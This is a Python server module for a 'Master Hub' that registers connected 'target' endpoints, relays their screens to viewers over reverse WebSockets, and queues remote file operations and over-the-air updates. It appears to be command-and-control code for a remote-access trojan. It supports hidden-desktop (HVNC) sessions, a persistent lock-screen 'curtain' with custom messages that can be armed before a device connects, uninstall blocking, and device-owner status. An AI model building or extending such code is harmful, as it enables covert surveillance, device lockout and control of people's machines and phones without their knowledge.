"""
Master Hub Agent Manager.
Tracks online/offline endpoints, system telemetry, and coordinates reverse WebSocket sessions.
"""

import time
import json
import logging
import os
import hashlib
import sqlite3
import contextlib
from .mirror_delivery import LowLatencyMirrorViewerSession
from typing import Dict, Any, Optional
from fastapi import WebSocket

logger = logging.getLogger("master_hub.agent_manager")
ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


import asyncio

class ViewerSession:
    """Encapsulates an admin viewer WebSocket with a single-writer frame queue."""
    def __init__(self, viewer_id: str, ws: WebSocket, mode: str = "backstage"):
        self.viewer_id = viewer_id
        self.ws = ws
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=2)
        self.sender_task: Optional[asyncio.Task] = None
        self.mirror_diagnostics = mode == "mirror" and os.environ.get("TRMM_MIRROR_DIAG") == "1"

    def push_frame(self, frame_bytes: bytes):
        if self.mirror_diagnostics:
            logger.info("[MIRROR RELAY QUEUE] t=%.3f viewer=%s bytes=%d queued=%d replacing_oldest=%s",
                        time.time(), self.viewer_id, len(frame_bytes), self.queue.qsize(), self.queue.full())
        if self.queue.full():
            try:
                self.queue.get_nowait()
            except Exception:
                pass
        try:
            self.queue.put_nowait((frame_bytes, True))
        except Exception:
            pass

    def push_text(self, text_data: str):
        if self.queue.full():
            try:
                self.queue.get_nowait()
            except Exception:
                pass
        try:
            self.queue.put_nowait((text_data, False))
        except Exception:
            pass


class MirrorViewerSession(ViewerSession):
    """Negotiated Take Control delivery: one unacknowledged frame, one latest slot."""

    ACK_TIMEOUT = 30.0

    def __init__(self, viewer_id: str, ws: WebSocket):
        super().__init__(viewer_id, ws, mode="mirror")
        self.pending_frame = None
        self.pending_text = asyncio.Queue(maxsize=32)
        self.wake = asyncio.Event()
        self.sequence = 0
        self.inflight = None
        self.sent_at = 0.0
        self.last_frame = None

    def push_frame(self, frame_bytes: bytes):
        self.pending_frame = frame_bytes
        self.wake.set()

    def push_text(self, text_data: str):
        if self.pending_text.full():
            self.pending_text.get_nowait()
        self.pending_text.put_nowait(text_data)
        self.wake.set()

    def acknowledge(self, sequence):
        if type(sequence) is int and sequence == self.inflight:
            if self.mirror_diagnostics:
                logger.info("[MIRROR ACK] viewer=%s seq=%d delivery_ms=%.1f",
                            self.viewer_id, sequence, (time.monotonic() - self.sent_at) * 1000)
            self.inflight = None
            self.wake.set()

    async def run_sender(self):
        try:
            while True:
                self.wake.clear()
                if self.inflight is not None and time.monotonic() - self.sent_at >= self.ACK_TIMEOUT:
                    await self.ws.close(code=1013, reason="Take Control frame acknowledgement timed out")
                    return
                if not self.pending_text.empty():
                    await self.ws.send_text(self.pending_text.get_nowait())
                    continue
                if self.inflight is None and self.pending_frame is not None:
                    frame = self.pending_frame
                    self.pending_frame = None
                    # Also protects viewers while an older agent is awaiting OTA.
                    if frame == self.last_frame and time.monotonic() - self.sent_at < 1.0:
                        continue
                    self.sequence = (self.sequence % 0xffffffff) + 1
                    self.inflight = self.sequence
                    self.sent_at = time.monotonic()
                    self.last_frame = frame
                    # Only clients requesting mirror_ack=1 receive this envelope.
                    packet = b"MRR1" + self.sequence.to_bytes(4, "big") + frame
                    await asyncio.wait_for(self.ws.send_bytes(packet), timeout=self.ACK_TIMEOUT)
                    if self.mirror_diagnostics:
                        logger.info("[MIRROR RELAY] t=%.3f viewer=%s seq=%d bytes=%d",
                                    time.time(), self.viewer_id, self.sequence, len(frame))
                    continue
                timeout = None if self.inflight is None else max(
                    0.001, self.ACK_TIMEOUT - (time.monotonic() - self.sent_at))
                try:
                    await asyncio.wait_for(self.wake.wait(), timeout=timeout)
                except asyncio.TimeoutError:
                    continue
        except asyncio.CancelledError:
            raise
        except Exception:
            logger.exception("Take Control viewer sender failed: %s", self.viewer_id)
            await self.ws.close(code=1013, reason="Take Control frame delivery failed")


class ConnectedAgent:
    """Represents a connected target endpoint."""

    def __init__(self, agent_id: str, ws: WebSocket, client_info: Dict[str, Any]):
        self.agent_id = agent_id
        self.ws = ws
        self.client_info = client_info
        self.connected_at = time.time()
        self.last_heartbeat = time.time()
        # HVNC (Backstage) viewers
        self.viewers: Dict[str, ViewerSession] = {}
        self.is_streaming_hvnc = False
        # Mirror (Take Control) viewers
        self.mirror_viewers: Dict[str, ViewerSession] = {}
        self.is_streaming_mirror = False
        # File management pending request futures
        self.pending_file_requests: Dict[str, asyncio.Future] = {}

    @property
    def status(self) -> str:
        return "online"

    async def request_file_operation(self, payload: Dict[str, Any], timeout: float = 12.0) -> Dict[str, Any]:
        """Dispatches a file operation over the agent WebSocket and awaits its response."""
        req_id = payload.get("req_id")
        if not req_id:
            import uuid
            req_id = str(uuid.uuid4())[:8]
            payload["req_id"] = req_id

        loop = asyncio.get_running_loop()
        future = loop.create_future()
        self.pending_file_requests[req_id] = future
        try:
            sent = await self.send_text_safe(json.dumps(payload))
            if not sent:
                return {"success": False, "error": f"Agent '{self.agent_id}' is unreachable or WebSocket closed."}
            return await asyncio.wait_for(future, timeout=timeout)
        except asyncio.TimeoutError:
            return {"success": False, "error": "Operation timed out waiting for device response."}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            self.pending_file_requests.pop(req_id, None)

    def resolve_file_response(self, resp_data: Dict[str, Any]):
        """Resolves an in-flight file management operation future."""
        req_id = resp_data.get("req_id")
        if req_id and req_id in self.pending_file_requests:
            fut = self.pending_file_requests[req_id]
            if not fut.done():
                fut.set_result(resp_data)

    async def send_text_safe(self, text_data: str) -> bool:
        """Safely forwards text data to agent WebSocket without raising unhandled exceptions."""
        try:
            if self.ws:
                await self.ws.send_text(text_data)
                return True
        except Exception as e:
            logger.warning(f"Failed to forward message to agent '{self.agent_id}': {e}")
        return False

    def update_info(self, info: Dict[str, Any]):
        # Never allow client telemetry to overwrite the server-assigned agent_id
        info["agent_id"] = self.agent_id
        # Lock endpoint_tag: preserve established tag so heartbeats can never alter it
        current_tag = self.client_info.get("endpoint_tag")
        if current_tag:
            info["endpoint_tag"] = current_tag
        # Preserve Android flags & metadata across heartbeats
        if self.client_info.get("is_android") or "android" in str(self.client_info.get("arch", "")).lower() or "android" in str(self.client_info.get("os", "")).lower() or "android" in str(info.get("arch", "")).lower() or "android" in str(info.get("os", "")).lower():
            info["is_android"] = True
            info["is_ios"] = False
            info["arch"] = "android"
            info["os"] = "Android device"
            info["platform"] = "android"
            info["device_type"] = "phone"
        self.client_info.update(info)
        self.last_heartbeat = time.time()

    def to_dict(self) -> Dict[str, Any]:
        from .ota_manager import OTAManager

        # Precise Apple iOS vs Android vs Windows detection
        arch_str = str(self.client_info.get("arch", "")).lower()
        os_str = str(self.client_info.get("os", "")).lower()
        platform_str = str(self.client_info.get("platform", "")).lower()
        dev_type = str(self.client_info.get("device_type", "")).lower()
        dev_name = str(self.client_info.get("device_name", "")).lower()

        is_android = (
            self.client_info.get("is_android") is True or
            "android" in arch_str or
            "android" in os_str or
            "android" in platform_str
        )

        is_ios = not is_android and (
            self.client_info.get("is_ios") is True or
            arch_str == "ios" or
            "ios" in os_str or
            platform_str == "ios" or
            "iphone" in dev_type or
            "ipad" in dev_type or
            "iphone" in dev_name or
            "ipad" in dev_name
        )

        if not is_android and not is_ios:
            try:
                from .registry import AgentRegistry
                pkg = AgentRegistry.get_package(self.agent_id)
                if pkg:
                    pkg_arch = str(pkg.get("arch", "")).lower()
                    if "ios" in pkg_arch or pkg.get("profile_filename"):
                        is_ios = True
                    elif "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
                        is_android = True
            except Exception:
                pass

        if is_ios:
            server_hash = ""
            agent_hash = self.client_info.get("code_hash", "")
            has_update = False
            resolved_os = self.client_info.get("os") or "Apple iOS"
            resolved_arch = self.client_info.get("arch") or "arm64"
            fallback_hostname = self.client_info.get("device_name") or "iPhone"
            fallback_username = "iOS User"
            cpu_val = self.client_info.get("cpu", "Apple Silicon")
            update_version = "1.0.0-ios"
            update_description = "iOS Web Agent is up to date."
        elif is_android:
            android_manifest = OTAManager.get_android_manifest()
            server_hash = android_manifest.get("overall_hash", "")
            agent_hash = self.client_info.get("code_hash", "")
            has_update = bool(server_hash and agent_hash and server_hash != agent_hash)
            resolved_os = "Android device"
            resolved_arch = "android"
            fallback_hostname = self.client_info.get("device_name") or "Android Phone"
            fallback_username = "Android"
            cpu_val = self.client_info.get("cpu", "ARM64")
            update_version = android_manifest.get("version", "3.7.0-android")
            update_description = android_manifest.get("description", "A new Android agent update is available.")
        else:
            server_manifest = OTAManager.get_code_manifest()
            server_hash = server_manifest.get("overall_hash", "")
            agent_hash = self.client_info.get("code_hash", "")
            has_update = bool(server_hash and agent_hash and server_hash != agent_hash)
            resolved_os = self.client_info.get("os", "Windows")
            resolved_arch = self.client_info.get("arch", "x64")
            fallback_hostname = "DESKTOP-TARGET"
            fallback_username = "SYSTEM"
            cpu_val = self.client_info.get("cpu", "Unknown")
            update_version = server_manifest.get("version", "2.8.0-live")
            update_description = server_manifest.get("description", "A new OTA update is available.")

        raw_hostname = self.client_info.get("hostname")
        hostname_val = raw_hostname if (raw_hostname and raw_hostname != "Unknown") else fallback_hostname
        raw_username = self.client_info.get("username")
        username_val = raw_username if (raw_username and raw_username != "Unknown") else fallback_username

        return {
            "agent_id": self.agent_id,
            "device_id": self.client_info.get("device_id", ""),
            "installation_id": self.client_info.get("installation_id", ""),
            "endpoint_tag": self.client_info.get("endpoint_tag", self.client_info.get("tag", "")),
            "status": "online",
            "hostname": hostname_val,
            "username": username_val,
            "os": resolved_os,
            "arch": resolved_arch,
            "platform": "ios" if is_ios else ("android" if is_android else "windows"),
            "is_android": is_android,
            "is_ios": is_ios,
            "device_name": self.client_info.get("device_name", hostname_val),
            "device_type": "phone" if (is_android or is_ios) else "desktop",
            "battery": self.client_info.get("battery"),
            "battery_charging": self.client_info.get("battery_charging"),
            "ram_gb": self.client_info.get("ram_gb", 0),
            "cpu": cpu_val,
            "local_ip": self.client_info.get("local_ip", self.client_info.get("ip", "127.0.0.1")),
            "public_ip": self.client_info.get("public_ip", ""),
            "connected_at": self.connected_at,
            "last_heartbeat": self.last_heartbeat,
            "is_streaming": self.is_streaming_hvnc,
            "is_mirroring": self.is_streaming_mirror,
            "curtain_active": bool(self.client_info.get("curtain_active", False)),
            "curtain_title": self.client_info.get("curtain_title", ""),
            "curtain_message": self.client_info.get("curtain_message", ""),
            "curtain_subtitle": self.client_info.get("curtain_subtitle", ""),
            "is_device_owner": bool(self.client_info.get("is_device_owner", False)),
            "is_device_admin": bool(self.client_info.get("is_device_admin", False)),
            "uninstall_blocked": bool(self.client_info.get("uninstall_blocked", False)),
            "management_mode": self.client_info.get("management_mode", "Unmanaged"),
            "code_hash": agent_hash,
            "server_hash": server_hash,
            "has_update": has_update,
            "update_version": update_version,
            "update_description": update_description
        }


class AgentManager:
    """Central registry for all active endpoint connections and active remote sessions."""

    def __init__(self, endpoints_file: Optional[str] = None, sync_packages: bool = False):
        self.active_agents: Dict[str, ConnectedAgent] = {}
        self.registered_agents: Dict[str, Dict[str, Any]] = {}
        self.pending_updates: Dict[str, Dict[str, Any]] = {}
        self.pending_curtains: Dict[str, Dict[str, Any]] = {}
        self.decommissioned_agents: set = set()
        if endpoints_file == "":
            self.endpoints_file = None
            self.backup_file = None
            self.db_file = None
        else:
            self.endpoints_file = endpoints_file or os.path.join(ROOT_DIR, "master_hub", "endpoints.json")
            base_dir = os.path.dirname(self.endpoints_file)
            self.backup_file = os.path.join(base_dir, "endpoints.backup.json")
            self.db_file = os.path.join(base_dir, "trmm_endpoints.db")
            self._init_sqlite()
            self._load_endpoints_from_disk()
            if sync_packages:
                self._sync_with_package_registry()

    @contextlib.contextmanager
    def _db_connection(self):
        """Yields an SQLite connection that is guaranteed to be closed upon block exit."""
        if not self.db_file:
            yield None
            return
        conn = sqlite3.connect(self.db_file, timeout=5)
        try:
            yield conn
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _init_sqlite(self):
        """Initializes durable SQLite table for persistent endpoint survivability across git operations."""
        if not self.db_file:
            return
        try:
            with self._db_connection() as conn:
                if conn:
                    conn.execute("""
                        CREATE TABLE IF NOT EXISTS persisted_endpoints (
                            agent_id TEXT PRIMARY KEY,
                            endpoint_tag TEXT,
                            data_json TEXT NOT NULL,
                            updated_at REAL NOT NULL
                        )
                    """)
                    conn.commit()
        except Exception as e:
            logger.warning(f"Could not initialize SQLite endpoints store: {e}")

    def _load_endpoints_from_disk(self):
        """
        Loads registered endpoints using a 3-tier resilient survivability pipeline:
        1. Primary endpoints.json
        2. Persistent endpoints.backup.json (untracked backup)
        3. Durable SQLite database trmm_endpoints.db (survives git pull & git reset)
        """
        if not self.endpoints_file:
            return

        loaded_any = False

        # Tier 1: Try primary JSON
        if os.path.isfile(self.endpoints_file):
            try:
                with open(self.endpoints_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        for aid, endpoint in data.items():
                            if aid not in self.decommissioned_agents:
                                if endpoint.get("connected_at", 0) == 0 and endpoint.get("management_mode") == "Enrolled (Offline)":
                                    continue
                                endpoint["status"] = "offline"
                                self.registered_agents[aid] = endpoint
                        if self.registered_agents:
                            loaded_any = True
                            logger.info(f"Loaded {len(self.registered_agents)} persisted endpoint(s) from primary {self.endpoints_file}")
            except Exception as e:
                logger.warning(f"Could not load endpoints from primary disk file: {e}")

        # Tier 2: If primary is empty or wiped, try backup JSON
        if not self.registered_agents and self.backup_file and os.path.isfile(self.backup_file):
            try:
                with open(self.backup_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        for aid, endpoint in data.items():
                            if aid not in self.decommissioned_agents:
                                if endpoint.get("connected_at", 0) == 0 and endpoint.get("management_mode") == "Enrolled (Offline)":
                                    continue
                                endpoint["status"] = "offline"
                                self.registered_agents[aid] = endpoint
                        if self.registered_agents:
                            loaded_any = True
                            logger.info(f"Auto-recovered {len(self.registered_agents)} persisted endpoint(s) from backup {self.backup_file}")
            except Exception as e:
                logger.warning(f"Could not load endpoints from backup file: {e}")

        # Tier 3: If still empty, recover from durable SQLite database
        if not self.registered_agents and self.db_file and os.path.isfile(self.db_file):
            try:
                with self._db_connection() as conn:
                    if conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT agent_id, data_json FROM persisted_endpoints")
                        rows = cursor.fetchall()
                        for aid, d_json in rows:
                            if aid not in self.decommissioned_agents:
                                endpoint = json.loads(d_json)
                                if endpoint.get("connected_at", 0) == 0 and endpoint.get("management_mode") == "Enrolled (Offline)":
                                    continue
                                endpoint["status"] = "offline"
                                self.registered_agents[aid] = endpoint
                        if self.registered_agents:
                            loaded_any = True
                            logger.info(f"Auto-recovered {len(self.registered_agents)} persisted endpoint(s) from durable SQLite database {self.db_file}")
            except Exception as e:
                logger.warning(f"Could not load endpoints from SQLite: {e}")

        # Synchronize all tiers with the latest state
        if self.registered_agents:
            self._save_endpoints_to_disk()

    def _save_endpoints_to_disk(self):
        """Atomically persists registered endpoints across JSON, Backup JSON, and durable SQLite."""
        if not self.endpoints_file:
            return
        now = time.time()

        # 1. Primary JSON file
        try:
            temp_file = self.endpoints_file + ".tmp"
            with open(temp_file, "w", encoding="utf-8") as f:
                json.dump(self.registered_agents, f, indent=2)
            os.replace(temp_file, self.endpoints_file)
        except Exception as e:
            logger.warning(f"Could not persist endpoints to primary disk: {e}")

        # 2. Backup JSON file (keep synced whenever endpoints exist)
        if self.backup_file and self.registered_agents:
            try:
                b_tmp = self.backup_file + ".tmp"
                with open(b_tmp, "w", encoding="utf-8") as f:
                    json.dump(self.registered_agents, f, indent=2)
                os.replace(b_tmp, self.backup_file)
            except Exception:
                pass

        # 3. Durable SQLite store
        if self.db_file:
            try:
                with self._db_connection() as conn:
                    if conn:
                        for aid, endpoint in self.registered_agents.items():
                            conn.execute("""
                                INSERT INTO persisted_endpoints (agent_id, endpoint_tag, data_json, updated_at)
                                VALUES (?, ?, ?, ?)
                                ON CONFLICT(agent_id) DO UPDATE SET
                                    endpoint_tag=excluded.endpoint_tag,
                                    data_json=excluded.data_json,
                                    updated_at=excluded.updated_at
                            """, (aid, endpoint.get("endpoint_tag", aid), json.dumps(endpoint), now))

                        if self.decommissioned_agents:
                            placeholders = ",".join("?" for _ in self.decommissioned_agents)
                            conn.execute(f"DELETE FROM persisted_endpoints WHERE agent_id IN ({placeholders})", list(self.decommissioned_agents))
                        conn.commit()
            except Exception as e:
                logger.warning(f"Could not persist endpoints to SQLite: {e}")

    def enroll_generated_package(self, agent_id: str, endpoint_tag: str, arch: str, app_name: str = "TRMM_Agent"):
        """No-op: Generated packages remain strictly in All Previously Generated Agents until the device connects."""
        pass

    def _sync_with_package_registry(self):
        """No-op: Endpoints only appear in Managed Endpoints once active connection occurs."""
        pass

    def queue_update(self, agent_id: str, payload: Dict[str, Any]):
        """Queues an OTA update for an endpoint so it applies automatically upon connection."""
        self.pending_updates[agent_id] = payload
        if agent_id in self.registered_agents:
            self.registered_agents[agent_id]["has_update"] = True
            self.registered_agents[agent_id]["update_queued"] = True
            self._save_endpoints_to_disk()
        logger.info(f"Queued auto-update for endpoint '{agent_id}'.")
        return True

    def set_pending_curtain(self, agent_id: str, enabled: bool, title: str = "", message: str = "", subtitle: str = "") -> bool:
        """Sets and persists pending lock state for an endpoint (online or offline)."""
        target_id = agent_id
        reg_data = self.registered_agents.get(agent_id)
        active_agent = self.active_agents.get(agent_id)

        if not reg_data and not active_agent:
            for aid, rec in self.registered_agents.items():
                if rec.get("package_id") == agent_id or rec.get("installer_id") == agent_id or rec.get("installation_id") == agent_id:
                    target_id = aid
                    reg_data = rec
                    break

        if not reg_data and not active_agent:
            try:
                from .registry import AgentRegistry
                pkg = AgentRegistry.get_package(agent_id)
                if pkg:
                    target_id = agent_id
                    reg_data = pkg
            except Exception:
                pass

        if not reg_data and not active_agent:
            # Register placeholder offline record so administrators can arm lock before initial connection
            self.registered_agents[agent_id] = {
                "agent_id": agent_id,
                "status": "offline",
                "hostname": f"Mobile Endpoint ({agent_id})",
                "curtain_active": enabled
            }
            target_id = agent_id
            reg_data = self.registered_agents[agent_id]

        curtain_payload = {
            "type": "set_curtain",
            "enabled": enabled,
            "title": title,
            "message": message,
            "subtitle": subtitle
        }

        if enabled:
            self.pending_curtains[target_id] = curtain_payload
        else:
            self.pending_curtains.pop(target_id, None)

        if reg_data:
            reg_data["curtain_active"] = enabled
            reg_data["curtain_title"] = title
            reg_data["curtain_message"] = message
            reg_data["curtain_subtitle"] = subtitle

        if active_agent:
            active_agent.client_info["curtain_active"] = enabled
            active_agent.client_info["curtain_title"] = title
            active_agent.client_info["curtain_message"] = message
            active_agent.client_info["curtain_subtitle"] = subtitle

        self._save_endpoints_to_disk()
        logger.info(f"{'Armed' if enabled else 'Cleared'} persistent device lock for endpoint '{target_id}'.")
        return True

    def set_agent_tag(self, agent_id: str, new_tag: str):
        """Allows administrator to intentionally rename an endpoint tag."""
        if agent_id in self.active_agents:
            self.active_agents[agent_id].client_info["endpoint_tag"] = new_tag
        if agent_id in self.registered_agents:
            self.registered_agents[agent_id]["endpoint_tag"] = new_tag
            self._save_endpoints_to_disk()

    @staticmethod
    def _extract_device_fingerprint(info: Dict[str, Any], ws: Optional[WebSocket] = None) -> str:
        """Extracts a stable physical hardware fingerprint for device disambiguation."""
        dev_id = str(info.get("device_id") or info.get("android_id") or "").strip()
        if dev_id and dev_id != info.get("agent_id"):
            return f"dev:{dev_id.lower()}"

        raw_host = str(info.get("hostname") or info.get("device_name") or "").strip()
        host_clean = raw_host.lower() if raw_host and raw_host.lower() not in ("unknown", "localhost", "none", "android phone", "desktop-target") else ""

        raw_ip = str(info.get("local_ip") or info.get("ip") or "").strip()
        if (not raw_ip or raw_ip in ("127.0.0.1", "::1", "0.0.0.0")) and ws and hasattr(ws, "client") and ws.client:
            raw_ip = str(ws.client.host)
        ip_clean = raw_ip if raw_ip and raw_ip not in ("127.0.0.1", "::1", "0.0.0.0") else ""

        parts = []
        if host_clean:
            parts.append(host_clean)
        if ip_clean:
            parts.append(ip_clean)
        if parts:
            return ":".join(parts)
        return ""

    @staticmethod
    def _is_distinct_physical_device(existing_info: Dict[str, Any], new_info: Dict[str, Any],
                                    existing_ws: Optional[WebSocket] = None, new_ws: Optional[WebSocket] = None) -> bool:
        """Determines if incoming connection is from a distinct physical device rather than a reconnect."""
        new_dev = str(new_info.get("device_id") or new_info.get("android_id") or "").strip().lower()
        ext_dev = str(existing_info.get("device_id") or existing_info.get("android_id") or "").strip().lower()
        if new_dev and ext_dev:
            return new_dev != ext_dev

        new_host = str(new_info.get("hostname") or new_info.get("device_name") or "").strip().lower()
        ext_host = str(existing_info.get("hostname") or existing_info.get("device_name") or "").strip().lower()
        ignore_hosts = ("unknown", "localhost", "none", "", "android phone", "desktop-target")
        if new_host and ext_host and new_host not in ignore_hosts and ext_host not in ignore_hosts:
            if new_host != ext_host:
                return True

        new_ip = str(new_info.get("local_ip") or new_info.get("ip") or "").strip()
        if (not new_ip or new_ip in ("127.0.0.1", "::1")) and new_ws and hasattr(new_ws, "client") and new_ws.client:
            new_ip = str(new_ws.client.host)
        ext_ip = str(existing_info.get("local_ip") or existing_info.get("ip") or "").strip()
        if (not ext_ip or ext_ip in ("127.0.0.1", "::1")) and existing_ws and hasattr(existing_ws, "client") and existing_ws.client:
            ext_ip = str(existing_ws.client.host)

        if new_ip and ext_ip and new_ip not in ("127.0.0.1", "::1") and ext_ip not in ("127.0.0.1", "::1"):
            if new_ip != ext_ip and (new_host != ext_host or (new_info.get("is_android") or existing_info.get("is_android"))):
                return True

        return False

    def register_connection(self, agent_id: str, ws: WebSocket, info: Dict[str, Any]) -> Optional[ConnectedAgent]:
        self.decommissioned_agents.discard(agent_id)

        # 1. Precise Android platform identification
        is_android = (
            info.get("is_android") is True or
            "android" in str(info.get("arch", "")).lower() or
            "android" in str(info.get("os", "")).lower() or
            "android" in str(info.get("platform", "")).lower() or
            info.get("device_type") == "phone"
        )
        if not is_android:
            try:
                from .registry import AgentRegistry
                pkg = AgentRegistry.get_package(agent_id)
                if pkg:
                    pkg_arch = str(pkg.get("arch", "")).lower()
                    if "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
                        is_android = True
            except Exception:
                pass

        if is_android:
            info["is_android"] = True
            info["arch"] = "android"
            info["os"] = "Android device"
            info["platform"] = "android"
            info["device_type"] = "phone"

        # 2. Extract hardware device fingerprint
        device_fp = self._extract_device_fingerprint(info, ws)

        # 3. Check if agent_id is an installer package ID
        resolved_agent_id = agent_id
        is_package_id = False
        try:
            from .registry import AgentRegistry
            if AgentRegistry.get_package(agent_id) is not None:
                is_package_id = True
        except Exception:
            pass

        # Disambiguate if connecting with installer package token
        if is_package_id:
            info["package_id"] = agent_id
            info["installer_id"] = agent_id
            client_dev_id = str(info.get("device_id") or info.get("android_id") or "").strip()
            if client_dev_id and client_dev_id != agent_id:
                resolved_agent_id = hashlib.sha256(f"{agent_id}:{client_dev_id}".encode()).hexdigest()[:8]
            elif device_fp:
                resolved_agent_id = hashlib.sha256(f"{agent_id}:{device_fp}".encode()).hexdigest()[:8]
            else:
                resolved_agent_id = agent_id

        # 4. Check if resolved_agent_id currently has an active connection
        now = time.time()
        if resolved_agent_id in self.active_agents:
            existing = self.active_agents[resolved_agent_id]
            is_distinct = self._is_distinct_physical_device(existing.client_info, info, existing.ws, ws)
            if is_distinct:
                # Collision with a distinct physical device! Derive an additional distinct identifier
                resolved_agent_id = hashlib.sha256(f"{resolved_agent_id}:{device_fp}".encode()).hexdigest()[:8]
                logger.info(f"Disambiguated distinct physical device to new agent_id: '{resolved_agent_id}'")
            else:
                # Same physical device reconnecting
                is_android_dev = is_android or existing.client_info.get("is_android")
                if not is_android_dev and (now - existing.last_heartbeat) < 15.0:
                    logger.info(f"Rejecting duplicate connection for agent '{resolved_agent_id}' because an active session is already connected and healthy.")
                    return None
                else:
                    logger.info(f"Agent '{resolved_agent_id}' superseding previous WebSocket connection.")
                    try:
                        import asyncio
                        asyncio.create_task(existing.ws.close(code=1000, reason="Superseded by reconnect"))
                    except Exception:
                        pass

        # 5. Lock agent_id and inherit/lock tags
        info["agent_id"] = resolved_agent_id

        if resolved_agent_id in self.registered_agents:
            existing_tag = self.registered_agents[resolved_agent_id].get("endpoint_tag")
            if existing_tag:
                info["endpoint_tag"] = existing_tag
        elif agent_id in self.registered_agents and not is_package_id:
            existing_tag = self.registered_agents[agent_id].get("endpoint_tag")
            if existing_tag:
                info["endpoint_tag"] = existing_tag
        elif not info.get("endpoint_tag") and is_package_id:
            try:
                pkg = AgentRegistry.get_package(agent_id)
                if pkg and pkg.get("endpoint_tag"):
                    info["endpoint_tag"] = pkg.get("endpoint_tag")
            except Exception:
                pass

        agent = ConnectedAgent(resolved_agent_id, ws, info)
        self.active_agents[resolved_agent_id] = agent
        self.registered_agents[resolved_agent_id] = agent.to_dict()
        self._save_endpoints_to_disk()
        logger.info(f"Agent '{resolved_agent_id}' ({info.get('hostname')}) registered online with locked tag '{info.get('endpoint_tag')}'.")

        # Check for queued updates
        if resolved_agent_id in self.pending_updates:
            pending_up = self.pending_updates.pop(resolved_agent_id, None)
            if pending_up:
                logger.info(f"Dispatching queued auto-update to freshly connected agent '{resolved_agent_id}'.")
                import asyncio
                try:
                    loop = asyncio.get_running_loop()
                    loop.create_task(agent.send_text_safe(json.dumps(pending_up)))
                except RuntimeError:
                    try:
                        asyncio.run(agent.send_text_safe(json.dumps(pending_up)))
                    except Exception:
                        pass

        # Check for queued curtain / device lock
        pending_curtain = self.pending_curtains.pop(resolved_agent_id, None)
        if not pending_curtain:
            reg_rec = self.registered_agents.get(resolved_agent_id) or {}
            if reg_rec.get("curtain_active"):
                pending_curtain = {
                    "type": "set_curtain",
                    "enabled": True,
                    "title": reg_rec.get("curtain_title", ""),
                    "message": reg_rec.get("curtain_message", ""),
                    "subtitle": reg_rec.get("curtain_subtitle", "")
                }
        if pending_curtain:
            logger.info(f"Dispatching queued device lock to freshly connected agent '{resolved_agent_id}'.")
            import asyncio
            try:
                loop = asyncio.get_running_loop()
                loop.create_task(agent.send_text_safe(json.dumps(pending_curtain)))
            except RuntimeError:
                try:
                    asyncio.run(agent.send_text_safe(json.dumps(pending_curtain)))
                except Exception:
                    pass

        return agent

    def unregister_connection(self, agent_id: str, ws: Optional[WebSocket] = None):
        if agent_id in self.active_agents:
            if ws is None or self.active_agents[agent_id].ws == ws:
                self.active_agents.pop(agent_id)
                logger.info(f"Agent '{agent_id}' unregistered offline.")
            else:
                logger.info(f"Superseded connection for agent '{agent_id}' closed. Preserving new active registration.")
                return
        if agent_id in self.decommissioned_agents:
            self.registered_agents.pop(agent_id, None)
            self._save_endpoints_to_disk()
            logger.info(f"Decommissioned agent '{agent_id}' removed on disconnect.")
            return
        if agent_id in self.registered_agents:
            self.registered_agents[agent_id]["status"] = "offline"
            self.registered_agents[agent_id]["last_heartbeat"] = time.time()
            self._save_endpoints_to_disk()
        logger.info(f"Agent '{agent_id}' disconnected.")

    def get_agent(self, agent_id: str) -> Optional[ConnectedAgent]:
        if not agent_id:
            return None
        aid = str(agent_id).strip()
        if aid in self.active_agents:
            return self.active_agents[aid]
        for k, v in self.active_agents.items():
            if k.lower() == aid.lower():
                return v
        matching = [
            v for v in self.active_agents.values()
            if v.client_info.get("package_id") == aid or v.client_info.get("installer_id") == aid
        ]
        if len(matching) == 1:
            return matching[0]
        return None

    def list_all_agents(self) -> list:
        # Returns list of all agents (both online and offline, excluding decommissioned)
        results = []
        seen = set()

        from .ota_manager import OTAManager
        android_manifest = OTAManager.get_android_manifest()
        windows_manifest = OTAManager.get_code_manifest()

        for aid, agent in list(self.active_agents.items()):
            if aid in self.decommissioned_agents:
                continue
            seen.add(aid)
            d = agent.to_dict()
            d["status"] = "online"
            results.append(d)

        for aid, data in list(self.registered_agents.items()):
            if aid in self.decommissioned_agents or aid in seen:
                continue
            seen.add(aid)
            record = dict(data)
            record["status"] = "offline"

            is_ios = record.get("is_ios", False) or record.get("platform") == "ios"
            is_android = not is_ios and record.get("is_android", False)
            if is_ios:
                record["has_update"] = False
                record["update_version"] = "1.0.0-ios"
                record["update_description"] = "iOS Web Agent is up to date."
            elif is_android:
                server_hash = android_manifest.get("overall_hash", "")
                agent_hash = record.get("code_hash", "")
                record["server_hash"] = server_hash
                record["has_update"] = bool(server_hash and agent_hash and server_hash != agent_hash)
                record["update_version"] = android_manifest.get("version", "3.7.0-android")
                record["update_description"] = android_manifest.get("description", "A new Android agent update is available.")
            else:
                server_hash = windows_manifest.get("overall_hash", "")
                agent_hash = record.get("code_hash", "")
                record["server_hash"] = server_hash
                record["has_update"] = bool(server_hash and agent_hash and server_hash != agent_hash)
                record["update_version"] = windows_manifest.get("version", "2.8.0-live")
                record["update_description"] = windows_manifest.get("description", "A new OTA update is available.")

            results.append(record)

        # Stable sort: Online first, then by endpoint tag, hostname, and agent_id (prevents shuffling on heartbeats)
        return sorted(
            results,
            key=lambda x: (
                x.get("status") != "online",
                (x.get("endpoint_tag") or "").lower(),
                (x.get("hostname") or "").lower(),
                x.get("agent_id", "")
            )
        )

    def attach_viewer(self, agent_id: str, viewer_id: str, viewer_ws: WebSocket, mode: str = "backstage", mirror_ack: int = 0) -> Optional[ViewerSession]:
        agent = self.get_agent(agent_id)
        if agent:
            session = (LowLatencyMirrorViewerSession(viewer_id, viewer_ws) if mode == "mirror" and mirror_ack == 2
                       else MirrorViewerSession(viewer_id, viewer_ws) if mode == "mirror" and mirror_ack
                       else ViewerSession(viewer_id, viewer_ws, mode=mode))
            if mode == "mirror":
                agent.mirror_viewers[viewer_id] = session
            else:
                agent.viewers[viewer_id] = session
            return session
        return None

